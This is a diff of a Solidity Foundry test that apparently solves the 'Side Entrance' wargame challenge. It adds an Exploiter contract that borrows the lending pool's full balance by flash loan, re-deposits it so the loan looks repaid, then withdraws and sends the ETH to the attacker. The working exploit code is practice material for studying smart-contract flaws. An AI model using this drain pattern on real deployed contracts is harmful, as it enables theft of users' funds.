@@ -34,7 +34,10 @@ contract SideEntrance is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+	vm.startPrank(attacker);
+	Exploiter x = new Exploiter(sideEntranceLenderPool, attacker);
+	x.exploit();
+	vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
@@ -43,4 +46,30 @@ contract SideEntrance is Test {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
+}
+
+contract Exploiter {
+	SideEntranceLenderPool pool;
+	address attacker;
+
+	uint borrowed = 0;
+
+	constructor(SideEntranceLenderPool _pool, address _attacker) {
+		pool = _pool;
+		attacker = _attacker;
+	}
+
+	function exploit() public {
+		uint balance = address(pool).balance;
+		pool.flashLoan(balance);
+
+		pool.withdraw();
+		attacker.call{value: balance}("");
+	}
+
+	function execute() external payable {
+		pool.deposit{value: address(this).balance}();
+	}
+
+	receive() external payable {}
 }
